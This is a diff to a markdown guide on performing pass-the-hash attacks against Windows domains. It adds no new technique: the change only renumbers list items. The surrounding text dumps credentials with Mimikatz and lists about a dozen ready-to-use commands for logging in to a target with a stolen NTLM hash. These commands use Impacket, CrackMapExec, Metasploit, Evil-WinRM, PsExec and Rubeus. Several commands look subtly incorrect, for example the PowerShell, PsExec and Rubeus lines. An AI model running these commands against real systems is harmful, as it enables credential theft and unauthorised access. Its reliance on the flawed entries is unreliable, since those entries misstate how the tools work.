@@ -20,8 +20,7 @@ In a PtH attack, the attacker captures a user's password hash and uses it to aut
 
 Here is a step-by-step guide to performing a PtH attack, including the tools and commands:
 
-<br/>
-+ **Capture the password hash**: The first step is to obtain the target user's password hash. This can be done using various methods, such as dumping hashes from the Security Account Manager (SAM) database or extracting hashes from a system's memory using tools like Mimikatz.
+1. **Capture the password hash**: The first step is to obtain the target user's password hash. This can be done using various methods, such as dumping hashes from the Security Account Manager (SAM) database or extracting hashes from a system's memory using tools like Mimikatz.
 
 Example command using Mimikatz:
 
@@ -35,19 +34,19 @@ mimikatz.exe privilege::debug sekurlsa::logonpasswords
 
 ### For Kali Linux/Linux
 
-1. **Impacket (pth-winexe)**
++ **Impacket (pth-winexe)**
 ```bash
 pth-winexe -U TARGET_DOMAIN/USER%NTLM_HASH //TARGET_IP cmd
 ```
-2. **Impacket (secretsdump.py)**
++ **Impacket (secretsdump.py)**
 ```bash
 python3 secretsdump.py -ntds TARGET_DOMAIN/USER:PASSWORD@TARGET_IP
 ```
-3. **CrackMapExec**
++ **CrackMapExec**
 ```bash
 crackmapexec smb TARGET_IP -u USER -H NTLM_HASH
 ```
-4. **Metasploit Framework (auxiliary module: smb_login)**
++ **Metasploit Framework (auxiliary module: smb_login)**
 ```bash
 msfconsole
 use auxiliary/scanner/smb/smb_login
@@ -57,36 +56,36 @@ set SMBUser USER
 set SMBPass NTLM_HASH
 run
 ```
-5. **Evil-WinRM**
++ **Evil-WinRM**
 ```bash
 evil-winrm -i TARGET_IP -u USER --hash NTLM_HASH
 ```
-6. **Wmiexec**
++ **Wmiexec**
 ```bash
 wmiexec.py -hashes LM_HASH:NTLM_HASH TARGET_DOMAIN/USER@TARGET_IP
 ```
-7. **Smbexec**
++ **Smbexec**
 ```bash
 smbexec.py -hashes LM_HASH:NTLM_HASH TARGET_DOMAIN/USER@TARGET_IP
 ```
 
 ### For Windows
 
-1. **Mimikatz**
++ **Mimikatz**
 ```bash
 mimikatz.exe "sekurlsa::pth /user:USER /domain:TARGET_DOMAIN /ntlm:NTLM_HASH /run:cmd.exe" "exit"
 ```
 
-2. **PowerShell Empire**
++ **PowerShell Empire**
 ```bash
 .\Invoke-PowerShellTcp.ps1 -Hash NTLM_HASH -Username USER -Domain TARGET_DOMAIN -IPAddress TARGET_IP
 ```
 
-3. **PsExec**
++ **PsExec**
 ```bash
 psexec.exe \\TARGET_IP -u TARGET_DOMAIN\USER -p NTLM_HASH cmd.exe
 ```
-4. **Rubeus**
++ **Rubeus**
 ```bash
 Rubeus.exe pth /user:USER /domain:TARGET_DOMAIN /ntlm:NTLM_HASH /target:TARGET_IP
 ```
